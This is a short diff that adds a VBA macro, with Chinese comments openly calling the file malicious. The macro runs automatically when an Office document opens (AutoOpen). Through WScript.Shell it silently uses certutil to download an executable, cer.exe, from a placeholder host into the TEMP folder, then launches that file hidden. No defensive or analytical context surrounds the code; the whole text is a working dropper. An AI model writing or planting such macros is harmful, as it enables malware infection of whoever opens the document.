@@ -1,0 +1,15 @@
+Sub AutoOpen()
+    ' 下载恶意文件
+    Dim ws As Object
+    Set ws = CreateObject("WScript.Shell")
+    Dim strURL As String
+    Dim strPath As String
+    strURL = "http://IP地址/payload/cer.exe"
+    strPath = Environ("TEMP") & "\cer.exe"
+
+    ' 使用Certutil下载文件
+    ws.Run "certutil -urlcache -split -f " & strURL & " " & strPath, 0, True
+
+    ' 运行下载的文件
+    ws.Run strPath, 0, False
+End Sub
